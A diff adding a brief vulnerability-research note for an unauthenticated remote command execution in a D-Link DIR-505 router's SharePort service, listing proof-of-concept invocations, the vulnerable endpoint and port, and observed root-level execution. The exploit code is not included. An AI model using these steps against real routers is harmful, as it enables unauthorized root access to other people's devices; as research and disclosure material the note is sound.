@@ -1,0 +1,14 @@
+Target: 192.168.0.1 (real D-Link DIR-505 A1, firmware 1.10B02)
+PoC: ../../poc/poc_shareport_unauth_rce.py
+Transport: TCP/8181 only (SharePort); no port 80 access.
+
+Commands:
+  python3 poc_shareport_unauth_rce.py --target 192.168.0.1 --id
+  python3 poc_shareport_unauth_rce.py --target 192.168.0.1 --cmd 'id'
+  python3 poc_shareport_unauth_rce.py --target 192.168.0.1 --cmd 'ls'
+  python3 poc_shareport_unauth_rce.py --target 192.168.0.1 --cmd 'uname -a'
+
+Observed:
+  - POST /dws/api/ListRoot returns 500 or 200; command still executes.
+  - Output fetched from http://192.168.0.1:8181/sp_<random>.txt.
+  - Uid: 0, Gid: 0, CapEff: fffffffffffffeff.
